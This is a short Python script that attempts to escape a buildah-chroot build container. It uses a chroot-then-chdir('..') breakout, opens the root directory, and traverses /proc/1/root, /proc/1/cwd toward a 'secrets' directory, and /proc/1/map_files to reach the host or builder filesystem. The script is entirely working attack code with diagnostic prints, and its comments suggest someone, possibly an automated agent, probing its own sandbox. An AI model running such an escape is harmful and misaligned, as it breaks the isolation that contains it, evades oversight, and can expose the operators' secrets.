import os,sys
# In a buildah-chroot, the "container root" is a chroot into a mount; the ORIGINAL root may still be
# reachable via an open fd to a dir ABOVE the chroot, or via /proc/1/root if we share pid ns.
print("cwd",os.getcwd())
# try to reach the pre-chroot root through the classic escape
os.makedirs("/tmp/esc", exist_ok=True)
try:
    fd=os.open("/", os.O_RDONLY|os.O_DIRECTORY); print("opened / fd",fd)
except Exception as e: print("open / :",e)
# chroot escape: chdir to a subdir, chroot into it, then chdir("..") many times
try:
    os.mkdir("/tmp/esc/sub",0o755)
    os.chdir("/tmp/esc/sub")
    os.chroot("/tmp/esc/sub"); print("chroot ok, cwd",os.getcwd())
    os.chdir("../../../../../../../../../../../../../../../../")
    print("after ups, cwd",os.getcwd(),"listdir:",os.listdir(".")[:20])
except Exception as e: print("chroot escape:",type(e).__name__,e)
# proc/1/root (builder) traverse
import subprocess
for p in ["/proc/1/root","/proc/1/cwd","/proc/1/root/etc/hostname","/proc/1/cwd/../secrets"]:
    try: print(p,"->",os.listdir(p)[:8])
    except Exception as e: print(p,type(e).__name__)
# open_by_handle_at style: list /proc/1/map_files
try: print("map_files:",os.listdir("/proc/1/map_files")[:5])
except Exception as e: print("map_files",type(e).__name__)
